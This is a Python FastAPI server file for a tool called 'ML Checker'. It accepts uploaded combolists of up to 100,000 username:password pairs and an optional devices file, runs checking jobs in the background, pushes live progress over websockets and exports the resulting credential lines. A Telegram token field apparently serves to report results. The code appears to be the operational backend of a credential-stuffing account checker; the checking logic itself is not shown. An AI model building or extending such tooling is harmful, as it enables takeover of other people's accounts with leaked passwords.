"""FastAPI entry point. Deploy-safe."""
from __future__ import annotations
import asyncio
import os
import signal
import tempfile
import time
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

from .jobs import manager
from .runner import run_job

BASE = Path(__file__).resolve().parent.parent
STATIC = BASE / "static"

_tasks: set[asyncio.Task] = set()


def _track(coro):
    t = asyncio.create_task(coro)
    _tasks.add(t)
    t.add_done_callback(_tasks.discard)
    return t


@asynccontextmanager
async def lifespan(app: FastAPI):
    yield
    # graceful shutdown: cancel running tasks
    for t in list(_tasks):
        t.cancel()
    if _tasks:
        await asyncio.gather(*_tasks, return_exceptions=True)


app = FastAPI(title="ML Checker", lifespan=lifespan)
if STATIC.exists():
    app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")


@app.get("/health")
async def health():
    return {"ok": True, "t": time.time()}


@app.get("/", response_class=HTMLResponse)
async def index():
    idx = STATIC / "index.html"
    if not idx.exists():
        return HTMLResponse("<h1>ML Checker</h1><p>UI missing.</p>")
    return HTMLResponse(idx.read_text(encoding="utf-8"))


@app.post("/api/jobs")
async def create_job(
    combolist: UploadFile = File(...),
    devices: UploadFile | None = File(None),
    telegram_token: str = Form(""),
    telegram_chat: str = Form(""),
):
    try:
        raw = (await combolist.read()).decode("utf-8", errors="replace")
    except Exception:
        raise HTTPException(400, "cannot read combolist")

    accounts: list[tuple[str, str]] = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        u, p = line.split(":", 1)
        u, p = u.strip(), p.strip()
        if u and p:
            accounts.append((u, p))

    if not accounts:
        raise HTTPException(400, "no valid account lines")
    if len(accounts) > 100_000:
        raise HTTPException(400, "combolist too large")

    devices_path = None
    if devices is not None:
        try:
            fd, tmp = tempfile.mkstemp(prefix="devices_", suffix=".txt")
            os.close(fd)
            Path(tmp).write_bytes(await devices.read())
            devices_path = tmp
        except Exception:
            devices_path = None

    job = await manager.create(
        accounts,
        devices_file=devices_path,
        telegram_token=telegram_token.strip() or None,
        telegram_chat=telegram_chat.strip() or None,
    )
    job._task = _track(run_job(job))
    return {"id": job.id, "total": job.total}


@app.get("/api/jobs")
async def list_jobs():
    return manager.list()


@app.get("/api/jobs/{jid}")
async def get_job(jid: str):
    job = manager.get(jid)
    if not job:
        raise HTTPException(404, "not found")
    return JSONResponse(job.snapshot())


@app.post("/api/jobs/{jid}/stop")
async def stop_job(jid: str):
    job = manager.get(jid)
    if not job:
        raise HTTPException(404, "not found")
    job._stop_flag = True
    return {"ok": True}


@app.websocket("/ws/{jid}")
async def ws_job(ws: WebSocket, jid: str):
    await ws.accept()
    job = manager.get(jid)
    if not job:
        try:
            await ws.send_json({"kind": "error", "msg": "job not found"})
        except Exception:
            pass
        await ws.close()
        return

    try:
        await ws.send_json({"kind": "snapshot", **job.snapshot()})
    except Exception:
        await ws.close()
        return

    q = job.subscribe()
    try:
        while True:
            try:
                entry = await asyncio.wait_for(q.get(), timeout=25.0)
            except asyncio.TimeoutError:
                # keepalive ping
                try:
                    await ws.send_json({"kind": "ping", "t": time.time()})
                except Exception:
                    break
                continue
            try:
                await ws.send_json(entry)
            except Exception:
                break
            if entry.get("kind") == "status" and entry.get("status") in ("done", "stopped", "error"):
                break
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        job.unsubscribe(q)
        try:
            await ws.close()
        except Exception:
            pass


@app.get("/api/jobs/{jid}/export")
async def export_job(jid: str):
    job = manager.get(jid)
    if not job:
        raise HTTPException(404, "not found")
    lines = []
    for r in job.results:
        base = f"{r['user']}:{r['pw']}"
        if r.get("line"):
            lines.append(f"{base} | {r['line']}")
        else:
            lines.append(base)
    return JSONResponse({"count": len(lines), "content": "\n".join(lines)})